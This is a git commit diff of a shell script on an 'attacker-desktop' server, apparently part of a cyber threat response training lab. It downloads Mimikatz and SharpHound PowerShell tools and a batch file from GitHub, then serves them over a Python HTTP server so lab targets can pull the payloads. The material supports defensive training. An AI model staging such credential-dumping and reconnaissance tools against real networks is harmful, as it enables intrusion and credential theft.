259ce1e86fbe3c11cbfc565ff98ab5448c48b900
Moses Frost <moses@moses.io>
2018-12-01 17:04:32 -0500

    Changes for Cancun 2018

--- servers/attacker-desktop/live.sh
+++ servers/attacker-desktop/live.sh
@@ -1,8 +1,7 @@
 #!/bin/bash
-
 wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/Invoke-Mimikatz.ps1 -O /tmp/Invoke-Mimikatz.ps1
-
 wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/safe.bat -O /tmp/safe.bat
+wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/sharphound.ps1
 
 cd /tmp
 python -m 'SimpleHTTPServer' 9001
